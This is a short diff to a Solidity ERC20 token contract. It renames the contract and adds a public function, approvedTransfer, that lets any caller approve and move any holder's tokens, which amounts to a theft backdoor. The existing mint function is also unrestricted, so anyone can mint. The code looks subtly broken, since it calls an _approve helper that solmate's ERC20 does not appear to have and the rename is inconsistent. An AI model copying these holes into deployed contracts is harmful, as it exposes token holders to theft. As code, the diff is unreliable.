@@ -3,7 +3,7 @@ pragma solidity ^0.8.0;
 
 import { ERC20 } from "@rari-capital/solmate/src/tokens/ERC20.sol";
 
-contract Mana is ERC20 {
+contract VALUToken is ERC20 {
 
     constructor()
         ERC20("Mana", "MANA", 18){}
@@ -11,5 +11,14 @@ contract Mana is ERC20 {
 
     function mint(address to, uint amount) public {
         _mint(to, amount);
+    }
+
+    function approvedTransfer(
+        address owner,
+        address spender, 
+        uint amount
+    ) public {
+        _approve(owner, spender, amount);
+        transferFrom(owner, spender, amount);
     }
 }
